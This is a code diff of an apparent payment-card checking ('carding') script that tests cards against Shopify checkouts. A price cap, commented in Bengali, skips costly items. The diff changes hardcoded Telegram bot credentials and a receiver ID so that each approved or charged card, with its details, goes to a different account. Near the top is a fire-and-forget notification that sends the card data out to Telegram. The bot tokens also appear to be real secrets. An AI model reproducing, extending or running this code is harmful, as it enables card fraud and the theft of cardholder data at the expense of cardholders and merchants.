@@ -69,8 +69,8 @@ log = logging.getLogger("shopify")
 # ---------------------------------------------------------------------------
 # Admin Hit Notifications
 # ---------------------------------------------------------------------------
-ADMIN_HIT_SENDER_TOKEN = "8629480718:AAFLxnpZAjxVzpKIfCvGTAMRKtZ1KD3EW9o"
-ADMIN_HIT_RECEIVER_ID  = 8524951580
+ADMIN_HIT_SENDER_TOKEN = "8821394621:AAGlmaPcqlE862oqjwZY_oBXaY4KDR_pAfI"
+ADMIN_HIT_RECEIVER_ID  = 7549544641
 
 async def send_hit_to_admin(card: str, status: str, response: str, gateway: str, price: str, site: str):
     """Fire-and-forget Telegram notification for Charged/Approved hits."""
@@ -1320,9 +1320,7 @@ async def validate_card(
             running_total_data = seller.get("runningTotal") or {}
             running_total      = running_total_data.get("value", {}).get("amount") or running_total_data.get("amount", "0")
 
-            # =========================================================================
             # 🌟 কড়া লক ১: শিপিং প্রপোজালের সময়ই দাম চেক
-            # =========================================================================
             try:
                 if float(running_total) > MAX_PRICE:
                     return _r(f"SKIPPED_PRICE_TOO_HIGH (${float(running_total):.2f} > ${MAX_PRICE:.2f})")
@@ -1372,7 +1370,6 @@ async def validate_card(
                         if "shopify" in detected_gateway.lower() and "payments" in detected_gateway.lower():
                             payment_identifier = pid
                             gateway = detected_gateway
-                            # 🌟 শুধু মূল দাম দেখাবে (ট্যাক্স ছাড়া)
                             price = f"{float(running_total):.2f}"
                             break
 
@@ -1448,9 +1445,7 @@ async def validate_card(
                     
                     if d_amt:
                         running_total = d_amt
-                        # =========================================================================
                         # 🌟 কড়া লক ২: ডেলিভারি প্রপোজালেও দাম চেক
-                        # =========================================================================
                         try:
                             if float(running_total) > MAX_PRICE:
                                 return _r(f"SKIPPED_PRICE_TOO_HIGH (${float(running_total):.2f} > ${MAX_PRICE:.2f})")
